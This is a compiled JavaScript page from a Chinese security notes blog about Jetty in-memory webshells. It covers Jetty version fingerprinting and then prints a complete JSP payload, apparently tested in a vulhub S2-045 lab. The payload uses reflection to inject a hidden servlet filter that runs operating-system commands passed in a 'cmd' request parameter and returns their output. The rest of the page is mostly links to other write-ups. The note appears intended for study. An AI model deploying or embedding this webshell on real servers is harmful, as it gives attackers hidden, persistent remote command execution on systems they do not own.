import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a,o as l}from"./app-CFt4SMiv.js";const t={};function i(p,e){return l(),n("div",null,e[0]||(e[0]=[a(`<h1 id="jetty内存马" tabindex="-1"><a class="header-anchor" href="#jetty内存马"><span>Jetty内存马</span></a></h1><p>Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。</p><p>Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术有着悠久的历史，可以轻松嵌入到应用程序中，同时仍然为 Web 应用程序部署提供可靠的传统发行版。</p><hr><h2 id="基本信息收集" tabindex="-1"><a class="header-anchor" href="#基本信息收集"><span>基本信息收集</span></a></h2><h3 id="查看版本号" tabindex="-1"><a class="header-anchor" href="#查看版本号"><span>查看版本号</span></a></h3><ul><li><p>Web侧的话</p><ul><li><p>响应标头中可能会有 Jetty 版本信息, 例如:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181629820.png" alt="image-20240918162938756"></p></li><li><p>Wappalyzer 应该也是用的上面这种方案获取的版本信息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181630064.png" alt="image-20240918163003019"></p></li></ul></li><li><p>主机侧的话</p><ul><li><p>可以在 JavaWeb 项目的 <code>pom.xml</code> 中看到 jetty 的版本号</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181623686.png" alt="image-20240918162309589"></p></li><li><p>直接 <code>find / | grep jetty</code> 也可能看到相应路径信息中显示的 jetty 版本信息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181624482.png" alt="image-20240918162417425"></p></li></ul></li></ul><hr><h2 id="构造可用的-servlet" tabindex="-1"><a class="header-anchor" href="#构造可用的-servlet"><span>构造可用的 Servlet</span></a></h2><p>Jetty 9.2.x 提供了更加安全且可维护的方式来处理 <code>Servlet</code> 的动态注册</p><p>可以通过 <code>ServletHandler</code> 和 <code>ServletHolder</code> 来动态注册 <code>Servlet</code>，并设置 URL 映射。这不再需要反射访问私有字段</p><blockquote><p>TODO: 搞不出来, 看了下 <code>web.xml</code> 里也没有配置 servlet mapping 之类的, 遂放弃</p></blockquote><hr><h2 id="构造内存马" tabindex="-1"><a class="header-anchor" href="#构造内存马"><span>构造内存马</span></a></h2><blockquote><p><a href="https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3" target="_blank" rel="noopener noreferrer">Jetty 内存马注入分析 - 先知社区 (aliyun.com)</a></p><p><a href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java" target="_blank" rel="noopener noreferrer">memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)</a></p><p><a href="https://3gstudent.github.io/" target="_blank" rel="noopener noreferrer">3gstudent-Blog</a></p><p><a href="https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)</a></p></blockquote><hr><h2 id="filter内存马" tabindex="-1"><a class="header-anchor" href="#filter内存马"><span>Filter内存马</span></a></h2><blockquote><p><a href="https://xz.aliyun.com/t/15141?u_atoken=1f048c5fb527d82d5ec4ba4c07b4c57d&amp;u_asig=0a472f8c17266484778997576e004d" target="_blank" rel="noopener noreferrer">从0到1学会Jetty内存马注入 - 先知社区 (aliyun.com)</a></p><p><a href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java" target="_blank" rel="noopener noreferrer">memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)</a></p><p><a href="https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">Java利用技巧——Jetty Filter型内存马 (3gstudent.github.io)</a></p><p><a href="https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3" target="_blank" rel="noopener noreferrer">Jetty 内存马注入分析 - 先知社区 (aliyun.com)</a></p></blockquote><p>环境: vulhub 的 s2-045 Docker, 其中 Jetty 版本为 9.2.11</p><hr><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Method&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Scanner&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.EnumSet&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    String filterName = &quot;myFilter&quot;;</span></span>
<span class="line"><span>    String urlPattern = &quot;/filter&quot;;</span></span>
<span class="line"><span>    Filter filter = new Filter() {</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void init(FilterConfig filterConfig) throws ServletException {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>
<span class="line"><span>            HttpServletRequest req = (HttpServletRequest) servletRequest;</span></span>
<span class="line"><span>            if (req.getParameter(&quot;cmd&quot;) != null) {</span></span>
<span class="line"><span>                boolean isLinux = true;</span></span>
<span class="line"><span>                String osTyp = System.getProperty(&quot;os.name&quot;);</span></span>
<span class="line"><span>                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {</span></span>
<span class="line"><span>                    isLinux = false;</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>                String[] cmds = isLinux ? new String[] {&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)} : new String[] {&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)};</span></span>
<span class="line"><span>                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span></span>
<span class="line"><span>                Scanner s = new Scanner( in ).useDelimiter(&quot;\\\\a&quot;);</span></span>
<span class="line"><span>                String output = s.hasNext() ? s.next() : &quot;&quot;;</span></span>
<span class="line"><span>                servletResponse.getWriter().write(output);</span></span>
<span class="line"><span>                servletResponse.getWriter().flush();</span></span>
<span class="line"><span>                return;</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void destroy() {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    };</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    Method threadMethod = Class.forName(&quot;java.lang.Thread&quot;).getDeclaredMethod(&quot;getThreads&quot;);</span></span>
<span class="line"><span>    threadMethod.setAccessible(true);</span></span>
<span class="line"><span>    Thread[] threads = (Thread[]) threadMethod.invoke(null);</span></span>
<span class="line"><span>    ClassLoader threadClassLoader = null;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    for (Thread thread:threads)</span></span>
<span class="line"><span>    {</span></span>
<span class="line"><span>        threadClassLoader = thread.getContextClassLoader();</span></span>
<span class="line"><span>        if(threadClassLoader != null){</span></span>
<span class="line"><span>            if(threadClassLoader.toString().contains(&quot;WebAppClassLoader&quot;)){</span></span>
<span class="line"><span>                Field fieldContext = threadClassLoader.getClass().getDeclaredField(&quot;_context&quot;);</span></span>
<span class="line"><span>                fieldContext.setAccessible(true);</span></span>
<span class="line"><span>                Object webAppContext = fieldContext.get(threadClassLoader);</span></span>
<span class="line"><span>                </span></span>
<span class="line"><span>                // 打印调试信息</span></span>
<span class="line"><span>                out.println(&quot;webAppContext class: &quot; + webAppContext.getClass().getName() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                out.println(&quot;webAppContext superclass: &quot; + webAppContext.getClass().getSuperclass().getName() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                </span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    // 获取 _servletHandler 字段</span></span>
<span class="line"><span>                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;_servletHandler&quot;);</span></span>
<span class="line"><span>                    fieldServletHandler.setAccessible(true);</span></span>
<span class="line"><span>                    Object servletHandler = fieldServletHandler.get(webAppContext);</span></span>
<span class="line"><span>                    Field fieldFilters = servletHandler.getClass().getDeclaredField(&quot;_filters&quot;);</span></span>
<span class="line"><span>                    fieldFilters.setAccessible(true);</span></span>
<span class="line"><span>                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);</span></span>
<span class="line"><span>                    boolean flag = false;</span></span>
<span class="line"><span>                    for(Object f:filters){</span></span>
<span class="line"><span>                        Field fieldName = f.getClass().getSuperclass().getDeclaredField(&quot;_name&quot;);</span></span>
<span class="line"><span>                        fieldName.setAccessible(true);</span></span>
<span class="line"><span>                        String name = (String) fieldName.get(f);</span></span>
<span class="line"><span>                        if(name.equals(filterName)){</span></span>
<span class="line"><span>                            flag = true;</span></span>
<span class="line"><span>                            break;</span></span>
<span class="line"><span>                        }</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    if(flag){</span></span>
<span class="line"><span>                        out.println(&quot;[-] Filter &quot; + filterName + &quot; exists.&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                        return;</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    out.println(&quot;[+] Add Filter: &quot; + filterName + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                    out.println(&quot;[+] urlPattern: &quot; + urlPattern + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();</span></span>
<span class="line"><span>                    Class sourceClazz = null;</span></span>
<span class="line"><span>                    Object holder = null;</span></span>
<span class="line"><span>                    Field field = null;</span></span>
<span class="line"><span>                    try{</span></span>
<span class="line"><span>                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.Source&quot;);</span></span>
<span class="line"><span>                        field = sourceClazz.getDeclaredField(&quot;JAVAX_API&quot;);</span></span>
<span class="line"><span>                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);</span></span>
<span class="line"><span>                        holder = method.invoke(servletHandler, field.get(null));</span></span>
<span class="line"><span>                    }catch(ClassNotFoundException e){</span></span>
<span class="line"><span>                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.BaseHolder$Source&quot;);</span></span>
<span class="line"><span>                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);</span></span>
<span class="line"><span>                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, &quot;JAVAX_API&quot;));</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    holder.getClass().getMethod(&quot;setName&quot;, String.class).invoke(holder, filterName);               </span></span>
<span class="line"><span>                    holder.getClass().getMethod(&quot;setFilter&quot;, Filter.class).invoke(holder, filter);</span></span>
<span class="line"><span>                    servletHandler.getClass().getMethod(&quot;addFilter&quot;, holder.getClass()).invoke(servletHandler, holder);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>                    Class  clazz         = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;);</span></span>
<span class="line"><span>                    Object filterMapping = clazz.newInstance();</span></span>
<span class="line"><span>                    Method method        = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;, holder.getClass());</span></span>
<span class="line"><span>                    method.setAccessible(true);</span></span>
<span class="line"><span>                    method.invoke(filterMapping, holder);</span></span>
<span class="line"><span>                    filterMapping.getClass().getMethod(&quot;setPathSpecs&quot;, String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});</span></span>
<span class="line"><span>                    filterMapping.getClass().getMethod(&quot;setDispatcherTypes&quot;, EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));</span></span>
<span class="line"><span>                    servletHandler.getClass().getMethod(&quot;prependFilterMapping&quot;, filterMapping.getClass()).invoke(servletHandler, filterMapping);</span></span>
<span class="line"><span>                } catch (NoSuchFieldException e) {</span></span>
<span class="line"><span>                    out.println(&quot;Error: &quot; + e.getMessage() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }     </span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201525001.png" alt="image-20240920152529930"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201459280.png" alt="image-20240920145928096"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201500230.png" alt="image-20240920150008171"></p><hr><h2 id="servlet型内存马" tabindex="-1"><a class="header-anchor" href="#servlet型内存马"><span>Servlet型内存马</span></a></h2><blockquote><p><a href="https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)</a></p></blockquote><hr><h2 id="customizer型内存马" tabindex="-1"><a class="header-anchor" href="#customizer型内存马"><span>Customizer型内存马</span></a></h2><blockquote><p><a href="https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/" target="_blank" rel="noopener noreferrer">一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现 - 白帽酱の博客 (rce.moe)</a></p></blockquote>`,30)]))}const o=s(t,[["render",i],["__file","index.html.vue"]]),c=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Jetty内存马","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全","Java"],"tags":["内存马","Jetty"],"description":"Jetty内存马 Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。 Jetty 是一种...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Jetty内存马"}],["meta",{"property":"og:description","content":"Jetty内存马 Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。 Jetty 是一种..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202409181629820.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"内存马"}],["meta",{"property":"article:tag","content":"Jetty"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Jetty内存马\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202409181629820.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409181630064.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409181623686.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409181624482.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201525001.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201459280.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201500230.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-09-19T11:10:39.000Z"},"headers":[{"level":2,"title":"基本信息收集","slug":"基本信息收集","link":"#基本信息收集","children":[{"level":3,"title":"查看版本号","slug":"查看版本号","link":"#查看版本号","children":[]}]},{"level":2,"title":"构造可用的 Servlet","slug":"构造可用的-servlet","link":"#构造可用的-servlet","children":[]},{"level":2,"title":"构造内存马","slug":"构造内存马","link":"#构造内存马","children":[]},{"level":2,"title":"Filter内存马","slug":"filter内存马","link":"#filter内存马","children":[]},{"level":2,"title":"Servlet型内存马","slug":"servlet型内存马","link":"#servlet型内存马","children":[]},{"level":2,"title":"Customizer型内存马","slug":"customizer型内存马","link":"#customizer型内存马","children":[]}],"git":{"createdTime":1726744239000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233"}]},"readingTime":{"minutes":3.23,"words":969},"filePathRelative":"网络安全/Web安全/漏洞类型/内存马/Java内存马/Jetty内存马/index.md","localizedDate":"2024年9月19日","excerpt":"","autoDesc":true}');export{o as comp,c as data};
